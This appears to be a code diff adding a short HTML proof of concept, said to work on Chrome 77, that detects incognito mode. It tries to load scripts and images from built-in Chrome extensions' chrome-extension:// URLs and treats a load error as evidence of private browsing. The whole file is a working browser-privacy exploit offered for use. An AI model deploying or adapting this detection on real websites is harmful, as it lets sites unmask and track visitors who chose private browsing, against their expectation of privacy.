@@ -1,0 +1,18 @@
+<html>
+<body>
+<script>
+function trigger() {
+	document.write("<h1 align='center'>You're incognito!</h1>");
+}
+</script>
+<!-- Using Google Docs Offline Extension -->
+<script src="chrome-extension://ghbmnnjooekpmoecnnnilnnbdlolhkhi/page_embed_script.js" onerror="trigger();"></script>
+<!-- Using Chrome Media Router (Chromecast™) Extension
+<script src="chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_sender.js" onerror="trigger();"></script>
+<script src="chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_setup/cast_app.js" onerror="trigger();"></script>
+<img src="chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_setup/chromecast_logo_grey.png" onerror="trigger();">
+-->
+</body>
+</html>
+
+<!-- Proof-of-concept (POC) works on latest version 77.0.3865.90 (Official Build) (64-bit) -->
